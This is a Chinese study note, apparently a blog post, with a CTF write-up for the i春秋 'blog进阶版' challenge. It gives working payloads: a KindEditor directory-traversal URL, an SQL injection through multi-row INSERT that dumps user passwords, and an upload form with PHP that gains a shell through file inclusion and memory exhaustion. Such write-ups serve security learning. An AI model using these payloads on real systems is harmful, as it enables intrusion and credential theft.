# I春秋学习记录

## 前言

之前因为系统崩溃掉，然后没有备份，之前学习过程中的笔记和知识点就都没有了，到时候再补吧，现在接着刷题。先把套路摸清了，然后再开始审计代码.....多花时间学习python的使用。近期的目标就是这样，最关键的是要掌握一门语言。多练吧，不要太功利地去想有没有用，喜欢就学，不和别人比，看到别人比我强，心里怪不是滋味的，说实话，但是自己也在努力嘛，偶尔有些懈怠，但是还是要极力去挣扎，说实话，学习过程中扫兴的地方挺多的，然后还是要去拧巴自己，不然生活太无聊了。



## 百度杯十二月赛

### blog进阶版

这题考察内存溢出，目录穿越，文件读取，sql注入

![](/home/cookie/Pictures/blogs/1.png)



注册一个用户进入后，到post页面，这里用的kindeditor有一个目录穿越漏洞，因为是历史漏洞，所以我们直接用它的payload就好了

![](/home/cookie/Pictures/blogs/2.png)

payload如下：

```
url/kindeditor/php/file_manager_json.php?path=/
```



在`post.php`是有一个`sql注入`

利用的是`insert into tables values(a,b,c),(d,e,f)`的特性

分析过程参考：[传送门](https://www.cnblogs.com/Ragd0ll/p/8778562.html)

然后我们就可以进行`sql注入`，payload:

```
insert into xxx values('coco','coco','    coco','x'),('hacker',(select group_concat(password) from users),'hacker             ','x')

title = 'coco'
content = "coco','x'),('hacker',(select group_concat(password) from users),'hacker"
```



然后获得admin的密码是:19-10-1997

admin中有Manager的模块，这里有文件包含，我们让其进行`自包含`，由于自包含，它就会无限次的包含manager.php，导致内存溢出，并且如果我们通过manager.php上传一个文件的话，文件都会暂时存在tmp文件夹中，因为内存溢出导致，服务器将会清除内存中的指令，这样子，内存中的指令就会被删除，正常情况下，由于tmp是临时文件，这一次的请求结束后，tmp中的内容就会被删除，然而内存溢出，导致上传的文件无法删除，getshell.

payload

```php+HTML
//upload.html
<body>
<form name='uploadForm' method='POST'
    enctype = "multipart/form-data"
    action="http://957e830253cb490686a81068ecd8c192496b7dff59b8465c.changame.ichunqiu.com/blog_manage/manager.php?module=manager&name=php">
    upload File1:<input type="file" name="file1" size="30"/>     
    <input type="submit" name="submit" value="submit">
    <form>
</body> 
    
//show_source.php
<?php


   show_source("/var/www/html/flag.php");


?>
   
```

我们使用先前的目录穿越获取到tmp中文件的文件名

![](/home/cookie/Pictures/blogs/3.png)



然后使用文件包含漏洞，去包含我们的shell文件

![](/home/cookie/Pictures/blogs/4.png)